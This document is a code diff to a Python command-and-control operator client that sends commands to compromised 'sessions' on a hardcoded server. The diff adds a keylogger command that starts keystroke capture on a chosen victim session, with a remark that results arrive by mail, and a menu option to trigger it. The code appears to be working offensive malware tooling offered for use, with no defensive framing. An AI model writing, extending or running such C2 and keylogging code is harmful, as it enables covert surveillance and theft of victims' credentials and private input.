@@ -10,7 +10,6 @@ class C2Server:
 
         self.host = "http://10.109.185.88:8000"
         self.sessions = "/sessions"
-        self.sleep = "/sleep"
         self.sess_list = []
 
     def get_sessions(self):
@@ -32,7 +31,7 @@ class C2Server:
 
     def set_sleep_time(self, session, time):
 
-        r = requests.get(f"{self.host}{self.sleep}?session={session}&time={time}")
+        r = requests.get(f"{self.host}/sleep?session={session}&time={time}")
         if r.status_code == 200:
             print("[+] Sleep time updated Zzzzz")
 
@@ -50,9 +49,12 @@ class C2Server:
         except requests.exceptions.ConnectionError:
             print("[!] Failed to establish a connection with C2")
 
+    def keylogger(self, session):
 
+        r = requests.get(f"{self.host}/keylogger?session={session}")
+        if r.status_code == 200:
+            print(f"[+] Started keylogger on {session}, check your mail...")
 
-    
 
 def get_action():
 
@@ -101,12 +103,22 @@ def get_action():
     elif action.upper() == "EXIT":
         exit(0)
     
-
     elif action.upper() == "SESSIONS":
         C2Server().get_sessions()
 
     elif action.upper() == "CHECK":
         C2Server().ping()
+
+    elif action.upper() == "KEYLOGGER":
+        while True:
+            try:
+                sess_list = C2Server().get_sessions()
+                choice = int(input("Enter a valid session number: ")) # getting session number
+                if (len(sess_list) - 1) >= choice >= 0:
+                    C2Server().keylogger(sess_list[choice][choice])
+                    break
+            except ValueError:
+                print("[!] Only integer values allowed!")
 
 
     else:
